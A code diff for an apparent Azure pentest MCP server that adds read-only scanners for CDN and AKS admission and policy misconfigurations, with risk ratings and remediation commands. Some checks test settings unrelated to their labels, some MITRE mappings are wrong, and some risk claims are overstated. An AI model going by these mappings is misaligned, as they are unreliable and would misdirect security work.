+      `| 🔴 CRITICAL | ${criticalCount} |`,
+      `| 🟠 HIGH | ${highCount} |`,
+      `| 🟡 MEDIUM | ${mediumCount} |`,
+      `| 🟢 LOW | ${lowCount} |`,
+      ``,
+    ];
+    lines.splice(riskSummaryIndex, 0, ...riskSummary);
+    
+    // Attack chains
+    lines.push(`## Attack Chains`);
+    lines.push(``);
+    lines.push(`| Attack Chain | Risk | MITRE |`);
+    lines.push(`|--------------|------|-------|`);
+    lines.push(`| Origin exposure → Direct attack → Bypass CDN/WAF | CRITICAL | T1190 - Exploit Public-Facing Application |`);
+    lines.push(`| Cache poisoning → Serve malicious content | MEDIUM | T1584.003 - Compromise Web Services |`);
+    lines.push(`| WAF bypass → Application exploitation | HIGH | T1190 - Exploit Public-Facing Application |`);
+    lines.push(`| HTTP allowed → MITM → Credential theft | HIGH | T1040 - Network Sniffing |`);
+    lines.push(`| Custom domain takeover → Phishing | MEDIUM | T1584.005 - Botnet |`);
+    lines.push(`| No geo-filtering → Global threat exposure | LOW | T1583 - Acquire Infrastructure |`);
+    lines.push(`| DDoS attack → Service unavailability | MEDIUM | T1498 - Network DoS |`);
+    lines.push(``);
+    
+    lines.push(`---`);
+    lines.push(`*Generated by Azure Pentest MCP v${SERVER_VERSION} - CDN & Front Door Security Scanner*`);
+    
+  } catch (error: any) {
+    lines.push(``);
+    lines.push(`[FAIL] Error scanning CDN: ${error.message}`);
+  }
+  
+  return lines.join('\n');
+}
+
+/**
+ * Scan AKS admission controllers for bypass vulnerabilities
+ */
+async function scanAKSAdmissionBypass(
+  subscriptionId: string,
+  resourceGroup?: string,
+  clusterName?: string,
+  format: string = "markdown"
+): Promise<string> {
+  const lines: string[] = [];
+  
+  try {
+    lines.push(`# AKS Admission Controller Bypass Scan`);
+    lines.push(`**Subscription:** ${subscriptionId}`);
+    lines.push(`**Resource Group:** ${resourceGroup || 'All'}`);
+    lines.push(`**Cluster:** ${clusterName || 'All'}`);
+    lines.push(`**Scan Time:** ${new Date().toISOString()}`);
+    lines.push(``);
+    
+    const aksClient = new ContainerServiceClient(credential, subscriptionId);
+    let clusters: any[] = [];
+    
+    // Get clusters to scan
+    if (clusterName && resourceGroup) {
+      const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
+      clusters.push(cluster);
+    } else if (resourceGroup) {
+      for await (const cluster of aksClient.managedClusters.listByResourceGroup(resourceGroup)) {
+        clusters.push(cluster);
+      }
+    } else {
+      for await (const cluster of aksClient.managedClusters.list()) {
+        clusters.push(cluster);
+      }
+    }
+    
+    if (clusters.length === 0) {
+      lines.push(`[INFO] No AKS clusters found`);
+      return lines.join('\n');
+    }
+    
+    let totalRisks = 0;
+    const findings: string[] = [];
+    
+    for (const cluster of clusters) {
+      const clusterFindings: string[] = [];
+      const clName = cluster.name || 'Unknown';
+      const clRg = cluster.id?.split('/')[4] || 'Unknown';
+      
+      clusterFindings.push(`## Cluster: ${clName}`);
+      clusterFindings.push(`**Resource Group:** ${clRg}`);
+      clusterFindings.push(`**Location:** ${cluster.location}`);
+      clusterFindings.push(``);
+      
+      // TC-ADMIT-001: ValidatingWebhookConfiguration bypass
+      // TC-ADMIT-002: MutatingWebhookConfiguration exploitation
+      // Check if cluster has webhook admission enabled
+      const addonProfiles = cluster.addonProfiles || {};
+      const azurePolicyEnabled = addonProfiles?.azurePolicy?.enabled;
+      
+      if (!azurePolicyEnabled) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-ADMIT-001: Azure Policy Addon Disabled`);
+        clusterFindings.push(`**Risk:** HIGH | **MITRE:** T1562.001 - Impair Defenses: Disable or Modify Tools`);
+        clusterFindings.push(`- Azure Policy addon is not enabled`);
+        clusterFindings.push(`- **Risk:** No admission control enforcement, pods can bypass security policies`);
+        clusterFindings.push(`- **Remediation:** Enable Azure Policy addon with \`az aks enable-addons -a azure-policy\``);
+        clusterFindings.push(``);
+      }
+      
+      // TC-ADMIT-004: Failure policy misconfiguration
+      const autoUpgradeProfile = cluster.autoUpgradeProfile;
+      if (!autoUpgradeProfile || autoUpgradeProfile.upgradeChannel === 'none') {
+        totalRisks++;
+        clusterFindings.push(`#### TC-ADMIT-004: Auto-Upgrade Disabled`);
+        clusterFindings.push(`**Risk:** MEDIUM | **MITRE:** T1211 - Exploitation for Defense Evasion`);
+        clusterFindings.push(`- Auto-upgrade channel: ${autoUpgradeProfile?.upgradeChannel || 'none'}`);
+        clusterFindings.push(`- **Risk:** Cluster may run outdated admission controllers with known bypasses`);
+        clusterFindings.push(`- **Remediation:** Enable auto-upgrade with \`az aks update --auto-upgrade-channel stable\``);
+        clusterFindings.push(``);
+      }
+      
+      // TC-ADMIT-008: Privileged pod creation bypass
+      const securityProfile = cluster.securityProfile;
+      const defenderEnabled = securityProfile?.defender?.securityMonitoring?.enabled;
+      
+      if (!defenderEnabled) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-ADMIT-008: No Defender for Containers`);
+        clusterFindings.push(`**Risk:** HIGH | **MITRE:** T1610 - Deploy Container`);
+        clusterFindings.push(`- Microsoft Defender for Containers: Disabled`);
+        clusterFindings.push(`- **Risk:** No runtime protection against privileged container creation`);
+        clusterFindings.push(`- **Remediation:** Enable Defender for Containers via Azure Security Center`);
+        clusterFindings.push(``);
+      }
+      
+      // TC-ADMIT-003: Namespace selector manipulation
+      const networkProfile = cluster.networkProfile;
+      const networkPolicy = networkProfile?.networkPolicy;
+      
+      if (!networkPolicy || networkPolicy === 'none') {
+        totalRisks++;
+        clusterFindings.push(`#### TC-ADMIT-003: No Network Policy`);
+        clusterFindings.push(`**Risk:** HIGH | **MITRE:** T1071 - Application Layer Protocol`);
+        clusterFindings.push(`- Network Policy: ${networkPolicy || 'none'}`);
+        clusterFindings.push(`- **Risk:** Pods can bypass namespace network isolation`);
+        clusterFindings.push(`- **Remediation:** Enable network policy (Azure CNI with Azure Network Policy or Calico)`);
+        clusterFindings.push(``);
+      }
+      
+      // TC-ADMIT-007: Admission review object injection
+      const apiServerAccessProfile = cluster.apiServerAccessProfile;
+      const authorizedIpRanges = apiServerAccessProfile?.authorizedIPRanges || [];
+      
+      if (authorizedIpRanges.length === 0 && !apiServerAccessProfile?.enablePrivateCluster) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-ADMIT-007: Public API Server`);
+        clusterFindings.push(`**Risk:** CRITICAL | **MITRE:** T1190 - Exploit Public-Facing Application`);
+        clusterFindings.push(`- API Server: Public access, no IP restrictions`);
+        clusterFindings.push(`- **Risk:** Anyone can send admission review requests to bypass validation`);
+        clusterFindings.push(`- **Remediation:** Enable private cluster or restrict API server access with authorized IP ranges`);
+        clusterFindings.push(``);
+      }
+      
+      findings.push(clusterFindings.join('\n'));
+    }
+    
+    lines.push(`## Risk Summary`);
+    lines.push(`**Clusters Scanned:** ${clusters.length}`);
+    lines.push(`**Total Risks Found:** ${totalRisks}`);
+    lines.push(``);
+    
+    if (totalRisks === 0) {
+      lines.push(`✅ **No admission controller bypass risks detected**`);
+      lines.push(``);
+    } else {
+      lines.push(`⚠️ **Findings:**`);
+      lines.push(``);
+      lines.push(findings.join('\n---\n\n'));
+    }
+    
+    lines.push(`## Remediation Recommendations`);
+    lines.push(``);
+    lines.push(`1. **Enable Azure Policy Addon** - Enforce pod security policies`);
+    lines.push(`2. **Enable Auto-Upgrade** - Keep admission controllers updated`);
+    lines.push(`3. **Enable Defender for Containers** - Runtime protection`);
+    lines.push(`4. **Configure Network Policy** - Enforce namespace isolation`);
+    lines.push(`5. **Restrict API Server Access** - Use private cluster or IP whitelist`);
+    lines.push(``);
+    
+  } catch (error: any) {
+    lines.push(`[FAIL] Error scanning AKS admission: ${error.message}`);
+  }
+  
+  return lines.join('\n');
+}
+
+/**
+ * Scan AKS for OPA/Kyverno policy bypass vulnerabilities
+ */
+async function scanAKSPolicyBypass(
+  subscriptionId: string,
+  resourceGroup?: string,
+  clusterName?: string,
+  format: string = "markdown"
+): Promise<string> {
+  const lines: string[] = [];
+  
+  try {
+    lines.push(`# AKS OPA/Kyverno Policy Bypass Scan`);
+    lines.push(`**Subscription:** ${subscriptionId}`);
+    lines.push(`**Resource Group:** ${resourceGroup || 'All'}`);
+    lines.push(`**Cluster:** ${clusterName || 'All'}`);
+    lines.push(`**Scan Time:** ${new Date().toISOString()}`);
+    lines.push(``);
+    
+    const aksClient = new ContainerServiceClient(credential, subscriptionId);
+    let clusters: any[] = [];
+    
+    // Get clusters to scan
+    if (clusterName && resourceGroup) {
+      const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
+      clusters.push(cluster);
+    } else if (resourceGroup) {
+      for await (const cluster of aksClient.managedClusters.listByResourceGroup(resourceGroup)) {
+        clusters.push(cluster);
+      }
+    } else {
+      for await (const cluster of aksClient.managedClusters.list()) {
+        clusters.push(cluster);
+      }
+    }
+    
+    if (clusters.length === 0) {
+      lines.push(`[INFO] No AKS clusters found`);
+      return lines.join('\n');
+    }
+    
+    let totalRisks = 0;
+    const findings: string[] = [];
+    
+    for (const cluster of clusters) {
+      const clusterFindings: string[] = [];
+      const clName = cluster.name || 'Unknown';
+      const clRg = cluster.id?.split('/')[4] || 'Unknown';
+      
+      clusterFindings.push(`## Cluster: ${clName}`);
+      clusterFindings.push(`**Resource Group:** ${clRg}`);
+      clusterFindings.push(`**Location:** ${cluster.location}`);
+      clusterFindings.push(``);
+      
+      // TC-POLICY-001: OPA Gatekeeper constraint exceptions
+      const addonProfiles = cluster.addonProfiles || {};
+      const azurePolicyEnabled = addonProfiles?.azurePolicy?.enabled;
+      const azurePolicyConfig = addonProfiles?.azurePolicy?.config;
+      
+      if (azurePolicyEnabled) {
+        // Check for audit-only mode
+        clusterFindings.push(`#### Azure Policy Addon Status`);
+        clusterFindings.push(`**Status:** Enabled`);
+        clusterFindings.push(`**Config:** ${JSON.stringify(azurePolicyConfig || {})}`);
+        clusterFindings.push(``);
+        
+        // TC-POLICY-003: Audit-only mode exploitation
+        // Note: Azure Policy uses Gatekeeper under the hood
+        clusterFindings.push(`#### TC-POLICY-003: Policy Enforcement Mode`);
+        clusterFindings.push(`**Risk:** MEDIUM | **MITRE:** T1562.001 - Impair Defenses`);
+        clusterFindings.push(`- **Note:** Azure Policy can be set to audit-only or deny mode per policy`);
+        clusterFindings.push(`- **Risk:** Audit-only policies don't block non-compliant resources`);
+        clusterFindings.push(`- **Remediation:** Review Azure Policy assignments, set enforcement mode to 'deny' for critical policies`);
+        clusterFindings.push(``);
+        totalRisks++;
+      } else {
+        // TC-POLICY-001: No policy engine
+        totalRisks++;
+        clusterFindings.push(`#### TC-POLICY-001: No Policy Engine`);
+        clusterFindings.push(`**Risk:** CRITICAL | **MITRE:** T1562.001 - Impair Defenses`);
+        clusterFindings.push(`- Azure Policy addon: Disabled`);
+        clusterFindings.push(`- **Risk:** No OPA Gatekeeper, no policy enforcement, complete bypass`);
+        clusterFindings.push(`- **Remediation:** Enable Azure Policy addon or deploy Kyverno manually`);
+        clusterFindings.push(``);
+      }
+      
+      // TC-POLICY-005: Background scanning disabled
+      const autoScalerProfile = cluster.autoScalerProfile;
+      if (!autoScalerProfile || !autoScalerProfile.scanInterval) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-POLICY-005: No Auto-Scaler Profiling`);
+        clusterFindings.push(`**Risk:** LOW | **MITRE:** T1496 - Resource Hijacking`);
+        clusterFindings.push(`- **Risk:** Existing resources not scanned for policy violations`);
+        clusterFindings.push(`- **Remediation:** Enable cluster auto-scaler with proper scan intervals`);
+        clusterFindings.push(``);
+      }
+      
+      // TC-POLICY-004: Policy scope limitation bypass
+      const rbac = cluster.aadProfile;
+      if (!rbac?.managed) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-POLICY-004: Non-Managed AAD RBAC`);
+        clusterFindings.push(`**Risk:** HIGH | **MITRE:** T1098.001 - Account Manipulation: Additional Cloud Credentials`);
+        clusterFindings.push(`- Azure AD Integration: Not managed or disabled`);
+        clusterFindings.push(`- **Risk:** Users can bypass policy scope restrictions without AAD enforcement`);
+        clusterFindings.push(`- **Remediation:** Enable managed AAD integration with RBAC`);
+        clusterFindings.push(``);
+      }
+      
+      // TC-POLICY-008: Resource exclusion abuse
+      const systemNodePools = cluster.agentPoolProfiles?.filter((p: any) => p.mode === 'System');
+      const userNodePools = cluster.agentPoolProfiles?.filter((p: any) => p.mode === 'User');
+      
+      if (systemNodePools && systemNodePools.length > 0) {
+        clusterFindings.push(`#### TC-POLICY-008: System Node Pool Taints`);
+        clusterFindings.push(`**Risk:** MEDIUM | **MITRE:** T1610 - Deploy Container`);
+        clusterFindings.push(`- System node pools: ${systemNodePools.length}`);
+        clusterFindings.push(`- **Risk:** If system pools aren't tainted, policies may be bypassed by scheduling there`);
+        clusterFindings.push(`- **Remediation:** Taint system node pools with \`CriticalAddonsOnly=true:NoSchedule\``);
+        clusterFindings.push(``);
+        totalRisks++;
+      }
+      
+      // TC-POLICY-006: Webhook failure mode exploitation
+      const networkProfile = cluster.networkProfile;
+      if (!networkProfile?.serviceCidr) {
+        totalRisks++;
+        clusterFindings.push(`#### TC-POLICY-006: Network Configuration Risk`);
+        clusterFindings.push(`**Risk:** MEDIUM | **MITRE:** T1599.001 - Network Boundary Bridging`);
+        clusterFindings.push(`- **Risk:** Misconfigured network may prevent webhook validation`);
+        clusterFindings.push(`- **Remediation:** Ensure proper service CIDR and DNS configuration`);
+        clusterFindings.push(``);
+      }
+      
+      findings.push(clusterFindings.join('\n'));
+    }
+    
+    lines.push(`## Risk Summary`);
+    lines.push(`**Clusters Scanned:** ${clusters.length}`);
+    lines.push(`**Total Risks Found:** ${totalRisks}`);
+    lines.push(``);
+    
+    if (totalRisks === 0) {
+      lines.push(`✅ **No policy bypass risks detected**`);
+      lines.push(``);
+    } else {
+      lines.push(`⚠️ **Findings:**`);
+      lines.push(``);
+      lines.push(findings.join('\n---\n\n'));
+    }
+    
+    lines.push(`## Remediation Recommendations`);
+    lines.push(``);
+    lines.push(`1. **Enable Azure Policy Addon** - Deploy Gatekeeper for policy enforcement`);
+    lines.push(`2. **Use Deny Mode** - Set critical policies to deny (not audit-only)`);
+    lines.push(`3. **Enable Managed AAD** - Enforce RBAC with Azure AD integration`);
+    lines.push(`4. **Taint System Pools** - Prevent workload scheduling on system nodes`);
+    lines.push(`5. **Monitor Policy Violations** - Use Azure Policy compliance dashboard`);
+    lines.push(``);
+    
+  } catch (error: any) {
+    lines.push(`[FAIL] Error scanning AKS policy: ${error.message}`);
+  }
+  
+  return lines.join('\n');
 }
 
 // Start the server
@@ -8515,7 +7749,7 @@ async function main() {
   console.error("\n[OK] Server Status: Running");
   console.error("Transport: stdio");
   console.error(`Version: ${SERVER_VERSION}`);
-  console.error("\nAvailable Tools (38):");
+  console.error("\nAvailable Tools (42):");
   console.error("\n  Multi-Location Scanning:");
   console.error("   1. list_active_locations     - Discover active Azure regions");
   console.error("   2. scan_all_locations        - Scan resources across regions");
@@ -8545,13 +7779,17 @@ async function main() {
   console.error("   22. scan_aks_live            - Live K8s API security scan (20 checks)");
   console.error("   23. scan_aks_imds            - IMDS exploitation & full recon");
   console.error("   24. scan_aks_pod_identity    - Pod Identity token theft scan");
+  console.error("\n  Container & Edge Security (NEW - 3 tools):");
+  console.error("   25. scan_container_apps_security - Container Apps vulnerability scanner");
+  console.error("   26. scan_gitops_security         - GitOps/Flux security audit");
+  console.error("   27. scan_cdn_security            - CDN/Front Door misconfiguration scan");
   console.error("\n  DevOps & Reporting:");
-  console.error("   25. scan_azure_devops        - Azure DevOps security scanner");
-  console.error("   26. generate_security_report - PDF/HTML/CSV report export");
+  console.error("   28. scan_azure_devops        - Azure DevOps security scanner");
+  console.error("   29. generate_security_report - PDF/HTML/CSV report export");
   console.error("\n[TIP] Quick Start:");
-  console.error("   scan_aks_pod_identity subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
-  console.error("   scan_aks_imds subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
-  console.error("   scan_aks_live subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
+  console.error("   scan_container_apps_security subscriptionId='SUB'");
+  console.error("   scan_gitops_security subscriptionId='SUB' resourceGroup='RG' clusterName='CLUSTER'");
+  console.error("   scan_cdn_security subscriptionId='SUB'");
   console.error("\nAuthentication: Using Azure CLI credentials (az login)");
   console.error("=".repeat(70) + "\n");
 }
